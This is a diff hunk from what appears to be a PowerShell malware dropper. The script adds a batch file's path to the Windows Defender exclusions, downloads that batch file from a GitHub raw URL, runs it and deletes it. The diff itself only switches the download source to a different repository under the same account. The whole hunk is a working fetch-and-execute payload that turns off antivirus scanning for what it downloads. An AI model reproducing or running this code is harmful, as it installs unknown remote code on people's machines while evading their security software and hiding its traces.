@@ -9,6 +9,6 @@ New-Item -Path $batPath -ItemType File -Force | Out-Null
  
 Add-MpPreference -ExclusionPath $batPath  -ErrorAction SilentlyContinue | Out-Null
  
-Invoke-WebRequest -Uri "https://raw.githubusercontent.com/al0nks1337/cartel/refs/heads/main/bat.bat" -OutFile $batPath
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/al0nks1337/al0nks1337.github.io/refs/heads/main/bat.bat" -OutFile $batPath
 Start-Process -FilePath $batPath -Wait | Out-Null
 Remove-Item -Path $batPath -Force -ErrorAction SilentlyContinue
